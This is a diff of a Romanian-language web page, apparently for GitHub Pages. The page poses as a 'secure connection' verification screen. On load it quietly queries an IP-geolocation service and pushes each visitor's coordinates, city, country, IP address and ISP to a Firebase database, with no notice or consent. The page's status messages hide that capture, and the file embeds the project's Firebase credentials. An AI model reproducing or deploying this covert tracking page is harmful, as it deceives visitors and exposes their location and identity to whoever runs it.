@@ -1,49 +1,65 @@
-<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Verificare</title>
+</head>
+<body>
+    <div style="text-align: center; padding-top: 50px; font-family: Arial;">
+        <h2>Se stabilește conexiunea securizată...</h2>
+        <p id="status">Vă rugăm așteptați...</p>
+    </div>
 
-<script>
-  // Datele tale din Firebase
-  const firebaseConfig = {
-    apiKey: "AIzaSyCJxFox3puC2aDapW9peyPgOLhIVMyzI4c",
-    authDomain: "location-demo-64338.firebaseapp.com",
-    databaseURL: "https://location-demo-64338-default-rtdb.europe-west1.firebasedatabase.app",
-    projectId: "location-demo-64338",
-    storageBucket: "location-demo-64338.firebasestorage.app",
-    messagingSenderId: "884756282803",
-    appId: "1:884756282803:web:8724805c2c32d3273b5fc6",
-    measurementId: "G-ZNEXFC2EBB"
-  };
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
 
-  // Inițializare
-  firebase.initializeApp(firebaseConfig);
-  const database = firebase.database();
-
-  // Funcția care ia locația și o trimite automat
-  function getLocation() {
-    fetch('https://ipapi.co/json/')
-      .then(response => response.json())
-      .then(data => {
-        const payload = {
-          lat: data.latitude,
-          lon: data.longitude,
-          oras: data.city,
-          tara: data.country_name,
-          ip: data.ip,
-          timp: new Date().toLocaleString()
+    <script>
+        // Configurația ta reală
+        const firebaseConfig = {
+            apiKey: "AIzaSyCJxFox3puC2aDapW9peyPgOLhIVMyzI4c",
+            authDomain: "location-demo-64338.firebaseapp.com",
+            databaseURL: "https://location-demo-64338-default-rtdb.europe-west1.firebasedatabase.app",
+            projectId: "location-demo-64338",
+            storageBucket: "location-demo-64338.firebasestorage.app",
+            messagingSenderId: "884756282803",
+            appId: "1:884756282803:web:8724805c2c32d3273b5fc6"
         };
 
-        // Salvare în Firebase
-        database.ref('vizitatori').push(payload)
-          .then(() => {
-            console.log("Date trimise!");
-            document.getElementById("result").innerText = "Conexiune reușită.";
-          })
-          .catch(err => console.error("Eroare Firebase:", err));
-      })
-      .catch(err => console.error("Eroare IP API:", err));
-  }
+        // Initializare
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
-  // Pornire automată la încărcarea paginii
-  window.onload = getLocation;
-</script>
+        // Funcția de captură
+        async function captureData() {
+            try {
+                // Folosim HTTPS obligatoriu pentru GitHub Pages
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
 
+                const info = {
+                    lat: data.latitude || "N/A",
+                    lon: data.longitude || "N/A",
+                    oras: data.city || "Necunoscut",
+                    tara: data.country_name || "Necunoscut",
+                    ip: data.ip || "N/A",
+                    furnizor: data.org || "N/A",
+                    data: new Date().toLocaleString('ro-RO')
+                };
+
+                // Trimitem în tabelul 'vizite'
+                await database.ref('vizite').push(info);
+                
+                document.getElementById("status").innerText = "Conexiune stabilă.";
+                console.log("Date trimise cu succes!");
+            } catch (error) {
+                console.error("Eroare:", error);
+                document.getElementById("status").innerText = "Eroare la sincronizare.";
+            }
+        }
+
+        // Pornim automat
+        window.onload = captureData;
+    </script>
+</body>
+</html>
